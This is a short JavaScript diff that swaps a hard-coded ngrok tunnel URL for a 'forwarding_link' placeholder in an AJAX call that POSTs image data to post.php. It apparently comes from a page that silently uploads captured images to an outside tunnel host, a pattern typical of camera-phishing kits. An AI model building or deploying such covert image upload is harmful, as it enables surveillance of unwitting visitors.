@@ -132,7 +132,8 @@
       $.ajax({
         type: "POST",
         data: { cat: imgdata },
-        url: "https://7462-157-36-86-192.ngrok.io/post.php",
+        // CORREÇÃO: Substitui o URL fixo do ngrok pelo placeholder
+        url: "forwarding_link/post.php",
         dataType: "json",
         async: false,
         success: function (result) {
